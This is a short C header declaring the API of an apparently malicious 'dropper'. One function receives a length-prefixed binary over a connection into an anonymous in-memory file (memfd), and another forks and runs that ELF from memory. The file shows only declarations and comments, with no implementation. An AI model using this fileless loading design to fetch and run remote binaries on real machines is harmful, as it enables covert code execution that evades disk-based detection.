#ifndef __DROPPER_H
#define __DROPPER_H

typedef struct {
    int memory_file_fd;
    const char *memory_file_name;
} dropper_context_t;

/**
 * @brief Receive a length-prefixed file into an anonymous
 * in-memory file (memfd). Wire protocol:
 *
 * 8 bytes  : file size, big-endian uint64_t
 * N bytes  : file contents
 *
 * On success, returns 0 and a memfd positioned at offset 0.
 * 
 * @param dropper_ctx 
 * @return int 
 */
int dropper_receive(dropper_context_t *dropper_ctx);

/**
 * @brief Run the memfd ELF received by dropper_receive.
 * 
 * Function automatically forks and runs the ELF in a child.
 * Child will be automatically reaped by kernel.
 * 
 * @param dropper_ctx 
 * @return int 
 */
int dropper_run(dropper_context_t *dropper_ctx);

#endif /* __DROPPER_H */
